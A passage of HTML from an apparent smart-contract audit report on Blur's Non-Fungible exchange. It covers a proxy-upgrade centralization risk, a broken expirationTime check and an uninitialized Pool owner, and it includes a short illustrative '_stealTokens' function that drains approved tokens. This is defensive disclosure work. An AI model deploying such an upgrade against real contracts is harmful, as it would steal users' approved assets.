0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (!success) revert ReturnDustFail();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/90#issuecomment-1341618491\">nonfungible47 (Blur) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Mitigation to check call status and revert if unsuccessful was implemented.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-hacked-owner-or-malicious-owner-can-immediately-steal-all-assets-on-the-platform\" style=\"position:relative;\"><a href=\"#m-02-hacked-owner-or-malicious-owner-can-immediately-steal-all-assets-on-the-platform\" aria-label=\"m 02 hacked owner or malicious owner can immediately steal all assets on the platform permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/179\">[M-02] Hacked owner or malicious owner can immediately steal all assets on the platform</a></h2>\n<p><em>Submitted by Trust, also found by 0xhacksmithh, 0xSmartContract, 9svR6w, deliriusz, Josiah, ladboy233, and zaskoh</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L639\">Exchange.sol#L639</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L30\">Exchange.sol#L30</a><br></p>\n<p>In Non-Fungible’s security model, users approve their ERC20 / ERC721 / ERC1155 tokens to the ExecutionDelegate contract, which accepts transfer requests from Exchange. </p>\n<p>The requests are made here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _transferTo(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address paymentToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (amount == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (paymentToken == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /* Transfer funds in ETH. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(to != address(0), &quot;Transfer to zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (bool success,) = payable(to).call{value: amount}(&quot;&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(success, &quot;ETH transfer failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (paymentToken == POOL) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /* Transfer Pool funds. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bool success = IPool(POOL).transferFrom(from, to, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(success, &quot;Pool transfer failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (paymentToken == WETH) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /* Transfer funds in WETH. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        executionDelegate.transferERC20(WETH, from, to, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert(&quot;Invalid payment token&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _executeTokenTransfer(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address collection,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    AssetType assetType</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /* Call execution delegate. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (assetType == AssetType.ERC721) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        executionDelegate.transferERC721(collection, from, to, tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (assetType == AssetType.ERC1155) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        executionDelegate.transferERC1155(collection, from, to, tokenId, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The issue is that there is a significant centralization risk trusting Exchange.sol contract to behave well, because it is an immediately upgradeable ERC1967Proxy. All it takes for a malicious owner or hacked owner to upgrade to the following contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _stealTokens(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address token,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    AssetType assetType</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) external onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /* Call execution delegate. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (assetType == AssetType.ERC721) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        executionDelegate.transferERC721(token, from, to, tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (assetType == AssetType.ERC1155) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        executionDelegate.transferERC1155(token, from, to, tokenId, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (assetType == AssetType.ERC20) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        executionDelegate.transferERC20(token, from, to, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>At this point hacker or owner can steal all the assets approved to Non-Fungible. </p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Hacked owner or malicious owner can immediately steal all assets on the platform.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Exchange contract proxy should implement a timelock, to give users enough time to withdraw their approvals before some malicious action becomes possible.</p>\n<h3 id=\"judging-note-from-warden\" style=\"position:relative;\"><a href=\"#judging-note-from-warden\" aria-label=\"judging note from warden permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Judging Note from Warden</h3>\n<p>The status quo regarding significant centralization vectors has always been to award Medium severity, in order to warn users of the protocol of this category of risks. See <a href=\"https://gist.github.com/GalloDaSballo/881e7a45ac14481519fb88f34fdb8837\">here</a> for list of centralization issues previously judged.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/179#issuecomment-1318420859\">berndartmuller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Using this submission as the primary issue for centralization risks.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/179#issuecomment-1324222401\">nonfungible47 (Blur) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"m-03-all-orders-which-use-expirationtime--0-to-support-oracle-cancellation-are-not-executable\" style=\"position:relative;\"><a href=\"#m-03-all-orders-which-use-expirationtime--0-to-support-oracle-cancellation-are-not-executable\" aria-label=\"m 03 all orders which use expirationtime  0 to support oracle cancellation are not executable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/181\">[M-03] All orders which use <code>expirationTime == 0</code> to support oracle cancellation are not executable</a></h2>\n<p><em>Submitted by Trust, also found by cccz</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L378\">Exchange.sol#L378</a><br></p>\n<p>The Blur Exchange supplied docs state:<br></p>\n<p><strong>Off-chain methods</strong><br>\n“Oracle cancellations - if the order is signed with an expirationTime of 0, a user can request an oracle to stop producing authorization signatures; without a recent signature, the order will not be able to be matched”</p>\n<p>From the docs, we can expect that when expirationTime is 0 , trader wishes to enable dynamic oracle cancellations. However, the recent code refactoring broke not only this functionality but all orders with expirationTime = 0.</p>\n<p>Previous _validateOrderParameters:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _validateOrderParameters(Order calldata order, bytes32 orderHash)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tinternal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tview</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturns (bool)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t/* Order must have a trader. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t(order.trader != address(0)) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t/* Order must not be cancelled or filled. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t(cancelledOrFilled[orderHash] == false) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t/* Order must be settleable. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t_canSettleOrder(order.listingTime, order.expirationTime)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">/**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> * @dev Check if the order can be settled at the current timestamp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> * @param listingTime order listing time</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> * @param expirationTime order expiration time</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function _canSettleOrder(uint256 listingTime, uint256 expirationTime)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tview</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tinternal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturns (bool)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn (listingTime &lt; block.timestamp) &amp;&amp; (expirationTime == 0 || block.timestamp &lt; expirationTime);</span></span></code></pre>\n<p>New _validateOrderParameters:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _validateOrderParameters(Order calldata order, bytes32 orderHash)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tinternal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tview</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturns (bool)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t/* Order must have a trader. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t(order.trader != address(0)) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t/* Order must not be cancelled or filled. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t(!cancelledOrFilled[orderHash]) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t/* Order must be settleable. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t(order.listingTime &lt; block.timestamp) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\t(block.timestamp &lt; order.expirationTime)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Note the requirements on expirationTime in _canSettleOrder (old) and _validateOrderParameters (new).<br>\nIf <code>expirationTime == 0</code>, the condition was satisfied without looking at <code>block.timestamp &#x3C; expirationTime</code>.<br>\nIn the new code, <code>block.timestamp &#x3C; expirationTime</code> is <em>always</em> required in order for the order to be valid. Clearly, <code>block.timestamp &#x3C; 0</code> will always be false, so all orders that wish to make use of off-chain cancellation will never execute.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>All orders which use <code>expirationTime == 0</code> to support oracle cancellation are not executable.</p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual audit, diffing tool</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement the checks the same way as they were in the previous version of Exchange.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/181#issuecomment-1324199484\">nonfungible47 (Blur) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This is correct, however, as the maintainers of the main orderbook, we can ensure that no current orders have been created with expirationTime of 0.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-pool-designed-to-be-upgradeable-but-does-not-set-owner-making-it-un-upgradeable\" style=\"position:relative;\"><a href=\"#m-04-pool-designed-to-be-upgradeable-but-does-not-set-owner-making-it-un-upgradeable\" aria-label=\"m 04 pool designed to be upgradeable but does not set owner making it un upgradeable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/186\">[M-04] Pool designed to be upgradeable but does not set owner, making it un-upgradeable</a></h2>\n<p><em>Submitted by Trust, also found by 0xDecorativePineapple, adriro, bin2chen, fs0c, hihen, neko_nyaa, philogy, and wait</em></p>\n<p>The docs state:<br>\n”<em>The pool allows user to predeposit ETH so that it can be used when a seller takes their bid. It uses an ERC1967 proxy pattern and only the exchange contract is permitted to make transfers.</em>”</p>\n<p>Pool is designed as an ERC1967 upgradeable proxy which handles balances of users in Not Fungible. Users may interact via deposit and withdraw with the pool, and use the funds in it to pay for orders in the Exchange.</p>\n<p>Pool is declared like so:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">contract Pool is IPool, OwnableUpgradeable, UUPSUpgradeable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction _authorizeUpgrade(address) internal override onlyOwner {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t...</span></span></code></pre>\n<p>Importantly, it has no constructor and no initializers. The issue is that when using upgradeable contracts, it is important to implement an initializer which will call the base contract’s initializers in turn. See how this is done correctly in Exchange.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">/* Constructor (for ERC1967) */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function initialize(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tIExecutionDelegate _executionDelegate,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tIPolicyManager _policyManager,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress _oracle,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint _blockRange</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) external initializer {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t__Ownable_init();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tisOpen = 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Since Pool skips the __Ownable_init initialization call, this logic is skipped:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function __Ownable_init() internal onlyInitializing {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t__Ownable_init_unchained();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function __Ownable_init_unchained() internal onlyInitializing {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t_transferOwnership(_msgSender());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Therefore, the contract owner stays zero initialized, and this means any use of onlyOwner will always revert.</p>\n<p>The only use of onlyOwner in Pool is here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _authorizeUpgrade(address) internal override onlyOwner {}</span></span></code></pre>\n<p>The impact is that when the upgrade mechanism will check caller is authorized, it will revert. Therefore, the contract is unexpectedly unupgradeable. Whenever the EXCHANGE or SWAP address, or some functionality needs to be changed, it would not be possible.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The Pool contract is designed to be upgradeable but is actually not upgradeable.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the ‘pool’ test in execution.test.ts, add the following lines:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">it(&#39;owner configured correctly&#39;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\texpect(await pool.owner()).to.be.equal(admin.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span></code></pre>\n<p>It shows that the pool after deployment has owner as 0x0000…00</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg 